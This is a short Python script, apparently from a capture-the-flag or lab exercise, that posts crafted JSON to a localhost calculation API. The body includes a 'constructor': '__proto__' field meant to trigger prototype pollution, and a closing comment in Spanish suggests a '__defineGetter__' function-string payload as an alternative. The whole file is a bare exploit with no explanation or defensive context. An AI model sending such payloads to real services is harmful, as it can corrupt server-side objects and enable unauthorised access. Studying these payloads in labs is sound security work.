import requests

url = 'http://localhost:1337/api/calculate'

student_data = {
	'name':'Youtuber',
	'paper':15,
	'constructor': '__proto__'
}

response = requests.post(url, json=student_data)

print(response.text)


                    
## Tipo string: '__defineGetter__': 'function(){return "Hola"}'